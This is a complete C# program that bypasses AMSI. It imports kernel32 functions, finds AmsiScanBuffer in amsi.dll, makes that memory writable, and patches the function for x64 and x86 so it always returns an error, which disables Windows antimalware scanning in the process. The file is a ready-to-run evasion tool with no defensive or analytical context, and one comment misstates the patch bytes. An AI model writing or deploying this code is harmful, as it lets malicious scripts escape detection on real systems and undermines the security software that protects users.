using System;
using System.Runtime.InteropServices;
class AmsiPatch
{
    // 1. Import necessary Windows API functions for memory manipulation
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    // Memory protection constants
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        PatchAmsi();
    }

    public static void PatchAmsi()
    {
        try
        {
            // 2. Load amsi.dll into the current process memory space
            IntPtr amsiModule = LoadLibrary("amsi.dll");
            if (amsiModule == IntPtr.Zero) return;

            // 3. Find the exact memory address of the AmsiScanBuffer function
            IntPtr amsiScanBufferAddr = GetProcAddress(amsiModule, "AmsiScanBuffer");
            if (amsiScanBufferAddr == IntPtr.Zero) return;

            // 4. Define the patch bytes
            // Architecture check: x64 requires different assembly instructions than x86
            byte[] patchBytes;
            if (IntPtr.Size == 8) // 64-bit architecture
            {
                // Assembly: 
                // mov eax, 0x80070057  (E8000780) -> Sets return value to E_INVALIDARG
                // ret                  (C3)       -> Returns immediately
                patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            else // 32-bit architecture
            {
                // Assembly:
                // mov eax, 0x80070057
                // ret 0x18             -> Cleans up the stack for x86 calling convention
                patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }

            // 5. Change the memory page protection to Page_Execute_ReadWrite (0x40)
            // This is required because executable code spaces are normally read-only (RX)
            uint oldProtect;
            VirtualProtect(amsiScanBufferAddr, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out oldProtect);

            // 6. Overwrite the original function prologue with our patch bytes
            Marshal.Copy(patchBytes, 0, amsiScanBufferAddr, patchBytes.Length);

            // 7. Restore the original memory protections (Good practice to avoid crashes)
            VirtualProtect(amsiScanBufferAddr, (UIntPtr)patchBytes.Length, oldProtect, out oldProtect);

            Console.WriteLine("[+] AMSI successfully patched in memory.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Patch failed: " + ex.Message);
        }
    }
}